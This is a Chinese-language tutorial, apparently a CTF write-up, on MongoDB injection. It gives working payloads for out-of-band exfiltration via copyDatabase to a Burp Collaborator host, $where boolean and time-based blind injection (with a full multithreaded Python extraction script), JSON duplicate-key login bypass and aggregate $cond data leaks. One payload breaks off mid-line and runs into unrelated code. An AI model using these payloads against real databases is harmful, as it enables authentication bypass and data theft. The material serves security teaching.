    error: { "$err" : "invalid operator: $where", "code" : 10068 }
**copyDatabase+findOne 外带注入**
(Burp > Burp Collaborator client > Copy to clipboard)
    db.copyDatabase('test','users',db.version()+'.5agd99kvce0rog1bz0pm23v16sci07.burpcollaborator.net')
    db.copyDatabase('test','users',tojson(db)+'.5agd99kvce0rog1bz0pm23v16sci07.burpcollaborator.net')
后面的有特殊字符就不好发，采用 javascript正则替换特殊字符为空
    db.copyDatabase('test','users',tojson(db.getCollectionNames()).replace(/[^0-9a-zA-Z]/gm, "")+'.e1g483buvimfd8qd7j2jltydj4pvdk.burpcollaborator.net')
    db.copyDatabase('test','users',tojson(db.users.findOne({},{_id:0})).replace(/[^0-9a-zA-Z]/gm, "")+'.e1g483buvimfd8qd7j2jltydj4pvdk.burpcollaborator.net')
但是直接嵌入 payload 中会发现有这个问题
    Assertion: 10298:can't temprelease nested write lock
mongdb 把嵌套写入的方式锁住了，所以一般不在数据库中执行可能几乎用不上。
###  where条件注入
> 使用$where运算符可以将包含JavaScript表达式的字符串或完整的JavaScript函数传递给MongoDB来执行
**有回显拼接注入**
    test;
    $coll = $db->users;
    $username = $_GET['u'];
    $password = $_GET['p'];
    $query = array('$where'=>"function() {if(this.username == '$username' && this.password == '$password') {return true;}}");
    xdebug_var_dump($query);
    $result = $coll->find($query);
    if ($result->count() > 0) {
        foreach ($result as $user) {
            echo 'username: '.$user['username']."";
            echo 'password: '.$user['password']."";
        }
    }
    else{
        echo 'Cannot find users :(';
    }
我们只需要在function中拼接我们需要的语句再返回就行了
    ?u='||1){return true;}}//&p=1
这样可以带出该集合下的所有用户
**where 布尔盲注**
然后可以制定特定的 payload 盲注据库名和集合
    ?u='||db.version()[0]=='2'){return true;}else{return false;}if('&p=1
根据正确返回和错误返回的特征进行判断，正确返回用户
错误返回未找到此用户
`==` 用多线程跑
    # -*- coding: utf-8 -*-    import threading
    import requests
    import random
    import base64
    user_agent = [
        "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"
    ]
    # threading sql injection
    class SQL(threading.Thread):
        def __init__(self, func, args):
            threading.Thread.__init__(self)
            self.func = func
            self.args = args
        def getresult(self):
            return self.res
        def run(self):
            self.res = self.func(*self.args)
    # bind sql injection
    def bind_sql(a, i):
        lock = threading.Lock()
        lock.acquire()
        for mid in range(32, 128):
            o = a + i
            # payload = "'||db.version()" + f"[{o}]=='{chr(mid)}')" + "{return true;}else{return false;}if('"
            # payload = "'||tojson(db)" + f"[{o}]=='{chr(mid)}')" + "{return true;}else{return false;}if('"
            # payload = "'||tojson(db.getCollectionNames())" + f"[{o}]=='{chr(mid)}')" + "{return true;}else{return false;}if('"
            payload = "'||tojson(db.users.find()[0])" + f"[{o}]=='{chr(mid)}')" + "{return true;}else{return false;}if('"
            # print(payload)
            headers = {'User-agent': user_agent[random.randint(0, 7)]}
            data = {
                'u': payload,
                'p': ''
            }
            # print(data)
            res = requests.get(url=url, params=data, headers=headers)
            # print(res.text)
            if "user1" in res.text:
                return mid
        # 跑快了容易429导致下面if执行而断片, 不必要时可注释
        # if mid == 127:
        #     return 0
        # lock.release()
    def main(thread):
        flag = ''
        # 从第一位开始
        a = 0
        f = True
        while f:
            threads = []
            for i in range(0, thread):
                t = SQL(bind_sql, (a, i))
                threads.append(t)
            for i in range(0, thread):
                threads[i].start()
            for i in range(0, thread):
                threads[i].join()
                ch = threads[i].getresult()
                # 以0结尾则停止注入
                if ch == 0:
                    f = False
                try:
                    flag = flag + chr(ch)
                except:
                    pass
            a = a + thread
            print(flag)
    if __name__ == '__main__':
        url = "http://localhost/CTF/test89/where1.php"
        # 一次输出几位
        thread = 5
        main(thread)
**where 时间盲注**
拿一道真实的例题来讲
    test;
    $coll = $db->user;
    $query = array('$where' => "if(this.username == '$username') {return true;}");
    xdebug_var_dump($query);
    $data = $coll->find($query);
    $data->count();
很明显 $where 存在拼接注入, 如果能用 sleep 那么 payload 将会是这样的
    ?u='||db.version()[0]=='1'){return true;}else{sleep(1000);}if('
不能使用的话就是用 DOS payload
    ?u='||db.version()[0]=='1'){return true;}else{(function(){var date = new Date(); do{curDate = new Date();}while(curDate-datetest->users;
        $raw_query = '{"username": "'.$username.'", "password": "'.$password.'"}';
        $document = $collection->findOne(json_decode($raw_query));
        if (isset($document) && isset($document->password)) {
            return true;
        }
        return false;
    }
    if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
        $user = auth($_COOKIE['username'], $_COOKIE['password']);
    }
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $user = auth($_POST['username'], $_POST['password']);
        if ($user) {
            setcookie('username', $_POST['username']);
            setcookie('password', $_POST['password']);
        }
    }
通过 POST 传参会自动设置为 Cookie 然后在 `$raw_query` 可以直接进行 Nosql 的拼接注入，无过滤，那我们需要达到的效果如下
    {"username":{"$regex":"^a"},"password":{"$ne":"1"}}
匹配 admin 用户但是密码不等于1，这样就能准确的匹配到 admin 账号，POST传参如下
    username[$regex]=^a&password[$ne]=1
但是本地测试后发现是 json_decode 搞得鬼，不能传数组过去，但是想到json传参有个二次赋值
    username=1&password=","password":{"$ne":"1"},"username":{"$regex":"^a"},"$where":"1
这样拼接进去
    {"username":"1","password":{"$ne":"1"},"username":{"$regex":"^a"},"$where":"1"}
username 相当于二次赋值，用正则去匹配，$where 则是达成一个永恒的正确条件，前提是前面查询不出错
进来以后接着往下看其他功能
        test->news;
            $pipeline = [
                ['$group' => ['_id' => '$category', 'count' => ['$sum' => 1]]],
                ['$sort' => ['count' => -1]],
                ['$limit' => 5],
            ];
            $filters = [
                ['$project' => ['category' => $filter]]
            ];
            $cursor = $collection->aggregate(array_merge($filters, $pipeline));
        ?>
>
> 聚合（aggregate）是基于数据处理的聚合管道，每个文档通过一个由多个阶段（stage）组成的管道，可以对每个阶段的管道进行分组、过滤等功能，然后经过一系列的处理，输出相应的结果
**注: mongodb 2.0.4 shell 没有这个功能，所以以下步骤采用了 mongodb 4.2.15 shell**
与 SQL 相比如下
SQL 操作/函数 | mongodb聚合操作  
---|---  
where | $match  
group by | $group  
having | $match  
select | $project  
order by | $sort  
limit | $limit  
sum() | $sum  
count() | $sum  
join | $lookup (v3.2 新增)  
**可以在aggregate()方法上使用的聚合运算符**
运算符 | 说明  
---|---  
$project |
通过重命名，添加或删除字段重塑文档。你也可以重新计算值，并添加子文档。例如，此例子包括title并排除name：{$project:{title:1,name:0}}；该例是把name重命名为title的例子:{$project{title:”$name”}}；这个例子是添加一个新的total字段，并用price和tax字段计算它的值的例子:{$project{total:{$add:[“$price”,”$tax”]}}}  
$match | 通过使用query对象运算符来过滤文档集  
$limit | 限定可以传递到聚合操作的下一个管道中的文档数量。例如{$limit:5}  
$skip | 指定处理聚合操作的下一个管道前跳过的一些文档  
$unwind | 指定一个数组字段用于分割，对每个值创建一个单独的文档。例如{$unwind:”$myArr”}  
$group |
把文档分成一组新的文档用于在管道中的下一级。新对象的字段必须在$group对象中定义。你还可以把表2中列出的分组表达式运算符应用到该组的多个文档中。例如，使用下面的语句汇总value字段：{$group:{set_id:”$0_id”,total:{$sum:”$value”}}}  
$sort |
在把文档传递给处理聚合操作的下一个管道前对它们排序。排序指定一个带有field:属性的对象，其中  
**聚合 $group 表达式运算符**
运算符 | 说明  
---|---  
$addToSet | 返回一组文档中所有文档所选字段的全部唯一值的数组。例如:colors:{$addToSet:”color”}  
$first | 返回一组文档中一个字段的第一个值。例如：firstValue:{$first:”$value”}  
$last | 返回一组文档中一个字段的最后一个值。例如:lastValue:{$last:”$value”}  
$max | 返回一组文档中一个字段的最大值。例如:maxValue:{$max:”$value”}  
$min | 返回一组文档中一个字段的最小值。例如:minValue:{$min:”$value”}  
$avg | 返回一组文档中以个字段的平均值。例如:avgValue:{$avg:”$value”}  
$push | 返回一组文档中所有文档所选字段的全部值的数组。例如:username:{$push:”$username”}  
$sum | 返回一组文档中以个字段的全部值的总和。例如:total:{$sum:”$value”}  
**可用在聚合表达式的字符串和算术运算符**
运算符 | 说明  
---|---  
$add | 计算数值的总和。例如：valuePlus5:{$add:[“$value”,5]}  
$divide | 给定两个数值，用第一个数除以第二个数。例如：valueDividedBy5:{$divide:[“$value”,5]}  
$mod | 取模。例如:{$mod:[“$value”,5]}  
$multiply | 计算数值数组的乘积。例如:{$multiply:[“$value”,5]}  
$subtract | 给定两个数值，用第一个数减去第二个数。例如:{$subtract:[“$value”,5]}  
$concat | 连接两个字符串 例如：{$concat:[“str1”,”str2”]}  
$strcasecmp | 比较两个字符串并返回一个整数来反应比较结果。例如 {$strcasecmp:[“$value”,”$value”]}  
$substr | 返回字符串的一部分。例如:hasTest：{$substr:[“$value”,”test”]}  
$toLower | 将字符串转化为小写。  
$toUpper | 将字符串转化为大写。  
在使用aggregate()聚合函数时，在里面是可以使用条件判断语句的。在MongoDB中 `$cond`表示if判断语句，匹配的符号使用
`$eq`，连起来为`[$cond][if][$eq]`，当使用多个判断条件时重复该语句即可。例如：
    db.users.aggregate(
        [
            {
                $project:
                  {
                    "authority":
                       {
                          $cond: { if : { $eq :["$username","admin"]}, then : "$username" , else: "employee"}
            },
            "checkpass":"$password"}
            }
        ]
    );
先是对 `$username` 和 `$password` 重命名为 authority 和 checkpass，当 `$username` 检测为
`admin` 时, 返回 `$username` 本身的值, 其余则返回字符串 `employee`，后面则是直接输出与之对应的密码。
回顾本题，首先看 `$pipline` ，将 `$category` 重命名为 `_id`，然后列出再排列再选取前5个数据输出，再看
`$filter`，会把 `$filter` 输出的值重命名为 category，那我们可以在 `$project` 中插入 `$cond`
判断语句，通过`if` 条件语句带出值为 `flags` 的 `$category`，其余则是输出字符串 `*`，如下：
    db.news.aggregate(
       [
          {
             $project:
               {
                 category:
                   {
                     $cond: { if: { $eq: [ "$category", "flags"] }, then: $title, else: "*" }
                   }
               }
          }
       ]
    )
转成 php 数组形式传入filter 参数，当然测试后发现了排序问题，有些传过去会导致我们的 flags 排序靠后所以看不到
    ?filter[$cond][if][$eq][]=$category&filter[$cond][if][$eq][]=flags&filter[$cond][then]=$title&filter[$cond][else]=*
提示 `This is a flag text`，然后修改 $title 为 $text
    ?filter[$cond][if][$eq][]=$category&filter[$cond][if][$eq][]=flags&filter[$cond][then]=$text&filter[$cond][else]=*
得到 flag
## 小结
对于外部拼接查询语句的内容，需对特殊字符严格过滤或转义，例如 $ 字符；对于 JavaScript 注入，$where 和 execute 方法尽量少用。
上述就是 MongoDB 特性注入的全部内容，如有不足，希望各位师傅踊跃提出！